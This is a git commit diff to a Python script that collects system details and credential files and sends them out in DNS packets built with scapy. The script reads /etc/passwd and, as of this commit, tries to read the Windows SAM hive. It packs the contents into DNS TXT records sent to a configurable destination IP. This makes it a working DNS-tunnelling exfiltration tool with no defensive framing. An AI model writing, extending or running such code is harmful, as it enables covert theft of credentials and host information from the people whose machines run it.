632f9644a9687df02d2e9175c4cfc48708fa8d19
TamarBarIlan <tamarbarilan.4@gmail.com>
2023-06-12 13:21:36 +0300

    Linux and Windows systems

--- attach_create.py
+++ attach_create.py
@@ -5,25 +5,11 @@ import socket
 import locale
 import time
 
-from scapy.layers.dns import DNS, DNSQR
-from scapy.layers.inet import IP, UDP
 from scapy.layers.dns import DNS, DNSQR, DNSRR
-
+from scapy.layers.inet import IP, UDP
 
 SOURCE_IP = '1.2.3.4'
-
-
-from scapy.all import *
-import platform
-import getpass
-import socket
-import locale
-import time
-
-from scapy.layers.dns import DNS, DNSQR, DNSRR
-
-
-DEST_IP = '127.0.0.1'  # Update with the actual destination IP address
+DEST_IP = '127.0.0.1'
 
 def get_details():
     os = platform.system()
@@ -32,28 +18,33 @@ def get_details():
     hostname = socket.gethostname()
     ip = socket.gethostbyname(hostname)
     language = locale.getdefaultlocale()[0] if locale.getdefaultlocale()[0] else "Unknown"
-    password_file = open('/etc/passwd', 'r').read()
+
+    if os == 'Windows':
+        password_file = open('C:\\Windows\\System32\\config\\SAM', 'r').read()
+    else:  # Assuming Linux system
+        password_file = open('/etc/passwd', 'r').read()
+
     return os, os_version, user, hostname, ip, language, password_file
 
 
-# This function sends the DNS query to the server with the given site name
 def send_dns_query(site, hostname, ip, language, password_file):
-    ip = IP(dst=DEST_IP)  # Update with the actual destination IP address
+    ip = IP(dst=DEST_IP)
     udp = UDP(sport=RandShort(), dport=53)
     dns = DNS(rd=1, qd=DNSQR(qname=site, qtype="TXT", qclass="IN"))
-    dns.an = DNSRR(rrname=site, type="TXT", rclass="IN", ttl=1, rdata=f"Hostname: {hostname}, IP: {ip}, Language: {language}, Password File: {password_file}")
+    dns.an = DNSRR(rrname=site, type="TXT", rclass="IN", ttl=1,
+                   rdata=f"Hostname: {hostname}, IP: {ip}, Language: {language}, Password File: {password_file}")
     packet = ip / udp / dns
     send(packet, verbose=0)
 
 
 if __name__ == '__main__':
-    details = get_details()  # Get the details of the system
-    hostname = details[3]  # Extract the hostname from the details
-    ip = details[4]  # Extract the IP address from the details
-    language = details[5]  # Extract the language from the details
-    password_file = details[6]  # Extract the password file contents from the details
+    details = get_details()
+    hostname = details[3]
+    ip = details[4]
+    language = details[5]
+    password_file = details[6]
 
-    for detail in details[:3]:  # Only iterate over the desired system details
+    for detail in details[:3]:
         site = detail.strip() + '.google.com'
         print(site)
         send_dns_query(site, hostname, ip, language, password_file)
